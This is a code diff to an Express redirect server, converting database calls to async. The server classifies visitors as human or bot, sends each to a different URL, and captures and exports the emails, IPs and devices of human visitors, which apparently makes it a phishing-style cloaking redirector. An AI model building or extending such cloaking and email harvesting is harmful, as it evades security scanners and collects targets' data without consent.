@@ -2141,11 +2141,11 @@ app.post('/api/ip-blacklist/import', authMiddleware, adminMiddleware, (req, res)
 // ==========================================
 
 // Get all captured emails (admin only)
-app.get('/api/captured-emails', authMiddleware, adminMiddleware, (req, res) => {
+app.get('/api/captured-emails', authMiddleware, adminMiddleware, async (req, res) => {
   const { limit = 1000, redirect_id, user_id } = req.query;
   
   // Get all captured emails from the array store
-  let emails = db.capturedEmails.getAll();
+  let emails = await db.capturedEmails.getAll();
   
   // Filter by redirect_id if provided
   if (redirect_id) {
@@ -2167,8 +2167,8 @@ app.get('/api/captured-emails', authMiddleware, adminMiddleware, (req, res) => {
 });
 
 // Get captured email stats (admin only)
-app.get('/api/captured-emails/stats', authMiddleware, adminMiddleware, (req, res) => {
-  const allEmails = db.capturedEmails.getAll();
+app.get('/api/captured-emails/stats', authMiddleware, adminMiddleware, async (req, res) => {
+  const allEmails = await db.capturedEmails.getAll();
   
   // Calculate stats
   const totalEmails = allEmails.length;
@@ -2205,8 +2205,8 @@ app.get('/api/captured-emails/stats', authMiddleware, adminMiddleware, (req, res
 });
 
 // Export captured emails to CSV (admin only)
-app.get('/api/captured-emails/export', authMiddleware, adminMiddleware, (req, res) => {
-  const emails = db.capturedEmails.getAll();
+app.get('/api/captured-emails/export', authMiddleware, adminMiddleware, async (req, res) => {
+  const emails = await db.capturedEmails.getAll();
   
   // Create CSV
   const headers = ['Email', 'Redirect ID', 'IP Address', 'Country', 'Browser', 'Device', 'Captured At'];
@@ -2231,11 +2231,11 @@ app.get('/api/captured-emails/export', authMiddleware, adminMiddleware, (req, re
 });
 
 // Get user's captured emails (user-specific)
-app.get('/api/user/captured-emails', authMiddleware, (req, res) => {
+app.get('/api/user/captured-emails', authMiddleware, async (req, res) => {
   const { limit = 100 } = req.query;
   
   // Get all captured emails
-  const allEmails = db.capturedEmails.getAll();
+  const allEmails = await db.capturedEmails.getAll();
   
   // Filter emails by user's redirects
   let emails = allEmails.filter(e => e.user_id === req.user.id);
@@ -2443,7 +2443,7 @@ app.post('/api/public/log-visit', async (req, res) => {
   }
   
   try {
-    const redirect = db.redirects.get(redirectId);
+    const redirect = await db.redirects.get(redirectId);
     if (!redirect) {
       return res.status(404).json({ error: 'Redirect not found' });
     }
@@ -2451,66 +2451,90 @@ app.post('/api/public/log-visit', async (req, res) => {
     // Parse user agent for details
     const deviceInfo = parseUserAgentDetails(userAgent);
     
-    // Log visitor
-    const visitor = db.visitorLogs.push({
-      redirectId,
-      ip,
-      userAgent,
-      classification,
+    // Convert classification to uppercase for consistency
+    const classificationUpper = classification.toUpperCase();
+    
+    // Log visitor with all required fields
+    const visitor = await db.visitorLogs.push({
+      id: generateId('visitor'),
+      redirect_id: redirectId,
+      redirect_name: redirect.name || 'Unknown',
+      user_id: redirect.user_id,
+      ip_address: ip,
       country: country || 'Unknown',
+      region: null,
       city: deviceInfo.city || 'Unknown',
       isp: deviceInfo.isp || 'Unknown',
-      device: deviceInfo.device || 'unknown',
-      browser: deviceInfo.browser || 'unknown',
-      timestamp: timestamp || new Date().toISOString()
+      user_agent: userAgent,
+      browser: deviceInfo.browser || 'Unknown',
+      device: deviceInfo.device || 'Unknown',
+      classification: classificationUpper,
+      trust_level: null,
+      decision_reason: null,
+      redirected_to: classificationUpper === 'HUMAN' ? redirect.human_url : redirect.bot_url,
+      visit_timestamp: timestamp ? new Date(timestamp) : new Date(),
+      created_date: new Date()
     });
     
     // Update stats
-    redirect.stats.totalClicks++;
-    if (classification === 'human') {
-      redirect.stats.humanClicks++;
+    const updates = {};
+    updates.total_clicks = (redirect.total_clicks || 0) + 1;
+    if (classificationUpper === 'HUMAN') {
+      updates.human_clicks = (redirect.human_clicks || 0) + 1;
     } else {
-      redirect.stats.botClicks++;
+      updates.bot_clicks = (redirect.bot_clicks || 0) + 1;
     }
-    db.redirects.update(redirect.id, redirect);
+    await db.redirects.update(redirectId, updates);
     
     // Capture email if human and provided
-    if (classification === 'human' && email) {
+    if (classificationUpper === 'HUMAN' && email) {
       const emailLower = email.toLowerCase();
-      const existingEmail = db.capturedEmails.getAll().find(
+      const allEmails = await db.capturedEmails.getAll();
+      const existingEmail = allEmails.find(
         e => e.email.toLowerCase() === emailLower
       );
       
       if (!existingEmail) {
-        db.capturedEmails.push({
+        await db.capturedEmails.push({
+          id: generateId('email'),
           email: email,
-          redirectId: redirect.id,
-          redirectName: redirect.name,
-          userId: redirect.userId,
-          source_url: source_url || '',
-          captured_at: new Date().toISOString(),
-          ip,
-          userAgent,
-          country: country || 'Unknown'
+          parameter_format: 'auto',
+          redirect_id: redirectId,
+          redirect_name: redirect.name,
+          redirect_url: source_url || '',
+          user_id: redirect.user_id,
+          classification: classificationUpper,
+          ip_address: ip,
+          country: country || 'Unknown',
+          user_agent: userAgent,
+          browser: deviceInfo.browser || 'Unknown',
+          device: deviceInfo.device || 'Unknown',
+          captured_at: new Date()
         });
         console.log(`[EMAIL CAPTURED] ${email} from redirect ${redirect.name}`);
       }
     }
     
     // Add to realtime events
-    const user = db.users.get(redirect.userId);
-    db.realtimeEvents.push({
-      type: 'redirect',
-      redirectId: redirect.id,
-      redirectName: redirect.name,
-      username: user?.username || 'Unknown',
-      classification,
+    const user = await db.users.findById(redirect.user_id);
+    const apiUser = user ? await db.apiUsers.findByEmail(user.email) : null;
+    await db.realtimeEvents.push({
+      id: generateId('event'),
+      visitor_type: classificationUpper,
+      ip_address: ip,
       country: country || 'Unknown',
-      ip,
-      timestamp: new Date().toISOString()
+      browser: deviceInfo.browser || 'Unknown',
+      device: deviceInfo.device || 'Unknown',
+      detection_method: 'companion-app',
+      trust_level: null,
+      redirect_id: redirectId,
+      redirect_name: redirect.name || 'Unknown',
+      user_id: redirect.user_id,
+      created_date: new Date(),
+      created_at: new Date()
     });
     
-    console.log(`[VISIT LOGGED] Redirect: ${redirect.name} | ${classification} | ${email || 'no email'}`);
+    console.log(`[VISIT LOGGED] Redirect: ${redirect.name} | ${classificationUpper} | ${email || 'no email'}`);
     
     res.json({
       success: true,
